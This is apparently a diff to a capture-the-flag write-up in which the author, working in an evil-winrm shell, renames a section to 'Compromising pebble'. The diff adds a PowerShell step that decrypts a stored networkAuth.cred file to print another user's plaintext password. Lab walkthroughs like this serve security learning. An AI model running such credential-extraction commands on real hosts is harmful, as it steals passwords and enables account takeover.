@@ -367,7 +367,7 @@ This user can winrm
 
 Then i can get the user flag
 
-# Enumerating the filesystem
+# Compromising `pebble`
 
 ```python
 evil-winrm-py PS C:\Users\schlop\Documents> type networkAuth.cred
@@ -406,6 +406,14 @@ evil-winrm-py PS C:\Users\schlop\AppData\Roaming\Microsoft\Protect\S-1-5-21-3773
 ```
 
 This is the key in appdata
+
+```python
+evil-winrm-py PS C:\Users\schlop> (Import-Clixml Documents\networkAuth.cred).GetNetworkCredential().Password
+PebbleIs47!
+evil-winrm-py PS C:\Users\schlop>
+```
+
+Ill then just decrypt the cred
 
 ```python
 
